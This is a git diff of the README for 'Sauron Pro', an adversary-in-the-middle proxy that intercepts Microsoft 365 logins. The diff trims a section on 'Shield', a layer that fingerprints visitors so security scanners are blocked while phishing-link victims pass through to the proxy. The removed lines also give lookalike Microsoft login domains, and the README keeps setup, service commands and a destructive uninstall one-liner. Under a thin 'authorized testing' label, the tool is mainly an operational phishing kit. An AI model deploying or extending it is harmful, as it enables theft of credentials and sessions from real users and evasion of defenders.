@@ -1,3 +1,4 @@
+
 # Sauron Pro - Advanced Microsoft 365 MITM Proxy
 
 [![Release](https://img.shields.io/github/v/release/Skillz147/Sauron-Pro)](https://github.com/Skillz147/Sauron-Pro/releases)
@@ -57,8 +58,6 @@ Professional-grade Microsoft 365 login flow interception for authorized security
 - Domain name (any registrar)
 - Cloudflare account (free tier)
 - Firebase project with Firestore enabled
-
-
 
 ### Easy Install
 
@@ -173,69 +172,14 @@ sudo ./force-stop-services.sh   # Force stop all services for updates
 
 Shield is an automatic bot filtering layer that protects Sauron from security scanners and automated tools.
 
-### How It Works
+**Note:** Shield is now a standalone application (separate VPS recommended).
 
-- User clicks phishing link → Shield intercepts first
-- Bot detection runs silently (Canvas, WebGL, behavioral analysis)
-- Bots are blocked → Legitimate users pass through to Sauron
-- Runs as independent systemd service
-
-### Service Management
+### Shield Connection Testing
 
 ```bash
-# Shield service operations
-sudo systemctl status shield      # Check Shield service status
-sudo systemctl restart shield    # Restart Shield service
-sudo systemctl stop shield       # Stop Shield service
-sudo systemctl start shield      # Start Shield service
-
-# View Shield logs
-sudo journalctl -u shield -f     # Live Shield logs
-sudo journalctl -u shield --since "1 hour ago"  # Recent Shield logs
-
-# Check both services
-sudo systemctl status sauron shield  # Check both services
-sudo systemctl restart sauron shield # Restart both services
+# Test Shield connectivity from Sauron VPS
+./scripts/test-shield-connection.sh
 ```
-
-### Development Mode
-
-```bash
-# Terminal 1: Start Sauron
-go run main.go
-
-# Terminal 2: Start Shield
-cd shield-domain
-go run main.go
-
-# Development URLs
-# Sauron: https://login.microsoftlogin.com:443
-# Shield: https://secure.get-auth.com:8444
-```
-
-### Production Mode
-
-```bash
-# Both services run independently on port 443
-# Sauron: https://login.microsoftlogin.com
-# Shield: https://secure.get-auth.com
-```
-
-### Configuration
-
-Shield is configured via `.env` file during setup:
-
-```bash
-# Run interactive configuration
-./configure-env.sh
-
-# Shield will prompt for:
-# - SHIELD_DOMAIN (your gateway domain)
-# - SHIELD_CLOUDFLARE_TOKEN (for SSL)
-# - SHIELD_TURNSTILE keys (for bot protection)
-```
-
-**Note:** Shield automatically starts when Sauron starts. No separate service needed.
 
 ---
 
@@ -412,6 +356,7 @@ sudo ./scripts/uninstall-sauron.sh
 ```
 
 **What gets removed:**
+
 - Sauron and Shield services and binaries
 - All configuration files and data
 - All SSL certificates (local and certmagic)
@@ -437,6 +382,7 @@ echo "✅ Sauron, Shield, and certificates removed!"
 ```
 
 **Quick one-liner:**
+
 ```bash
 sudo systemctl stop sauron.service shield.service 2>/dev/null; sudo systemctl disable sauron.service shield.service 2>/dev/null; sudo rm -f /etc/systemd/system/sauron.service /etc/systemd/system/shield.service; sudo rm -f /usr/local/bin/sauron* /usr/local/bin/shield; sudo rm -rf /opt/sauron /var/lib/sauron /etc/sauron /home/sauron /root/sauron /tmp/sauron*; sudo rm -rf /opt/shield /var/lib/shield /etc/shield /home/shield /root/shield /tmp/shield*; find ~ -name ".local" -type d -exec rm -rf {}/share/certmagic \; 2>/dev/null; sudo pkill -f sauron 2>/dev/null; sudo pkill -f shield 2>/dev/null; sudo systemctl daemon-reload; echo "✅ Sauron, Shield, and certificates removed!"
 ```
